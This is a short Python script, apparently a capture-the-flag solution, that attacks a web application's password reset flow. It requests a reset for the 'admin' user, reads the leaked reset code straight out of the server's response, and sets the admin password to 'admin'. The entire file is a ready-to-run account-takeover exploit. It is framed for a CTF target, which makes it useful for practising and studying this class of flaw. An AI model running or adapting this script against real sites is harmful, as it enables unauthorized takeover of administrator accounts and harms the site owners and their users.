import requests


print(f"[ *** Resetting Admin Credentials... *** ]")

url = input("CTF url: ")
data: dict = {
    "form_name": "reset",
    "username": "admin",
    "is_tenant": "1"
}


req = requests.post(url=f"{url}/reset.php", data=data)
reset_code = req.text.split(' code ')[1].split()[0].strip().rstrip()

print(f"[ *** Reset Code: {reset_code} *** ]")

print(f"[ Sending reset request now.... ]")

data: dict = {
    "form_name": "set_new_password",
    "code": f"{reset_code}",
    "username": "admin",
    "password": "admin",
    "password_confirm": "admin"
}
req = requests.post(url=f"{url}/set_new_password.php", data=data).text.lower()
with open('test.html', 'w') as f:
    f.write(req)
if "success" in req:
    print(f"[ *** Successfully reset creds to admin:admin ! *** ]")


